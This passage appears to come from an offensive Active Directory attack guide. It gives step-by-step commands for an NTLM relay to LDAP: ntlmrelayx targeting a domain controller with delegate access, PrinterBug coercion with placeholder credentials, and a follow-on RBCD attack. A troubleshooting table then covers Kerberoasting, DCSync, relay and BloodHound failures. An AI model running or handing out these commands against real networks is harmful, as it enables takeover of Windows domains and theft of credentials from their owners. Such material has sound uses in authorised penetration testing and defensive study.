# Example 2: NTLM Relay to LDAP

```bash
# 1. Start relay targeting LDAP
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# 2. Trigger authentication (e.g., via PrinterBug)
python3 printerbug.py domain.local/user:pass@target 10.10.10.12

# 3. Use created machine account for RBCD attack
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try LDAP target |
| BloodHound empty | Verify collector ran with correct creds |

---

## Additional Resources

For advanced techniques including delegation attacks, GPO abuse, RODC attacks, SCCM/WSUS deployment, ADCS exploitation, trust relationships, and Linux AD integration, see [references/advanced-attacks.md](references/advanced-attacks.md).